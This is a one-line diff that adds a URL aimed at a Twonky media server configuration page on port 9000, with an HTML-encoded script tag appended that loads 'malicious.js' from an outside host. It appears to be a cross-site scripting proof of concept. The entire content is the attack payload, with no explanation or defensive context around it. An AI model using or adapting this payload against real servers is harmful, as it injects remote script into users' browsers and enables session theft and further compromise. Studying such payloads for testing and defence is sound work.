@@ -1,0 +1,1 @@
+http://www.example.com/twonky:9000/fake_config_page&lt;script type=&quot;text/javascript&quot;src=&quot;http://www.example.com//malicious.js&quot;; &gt;&lt;/script&gt;
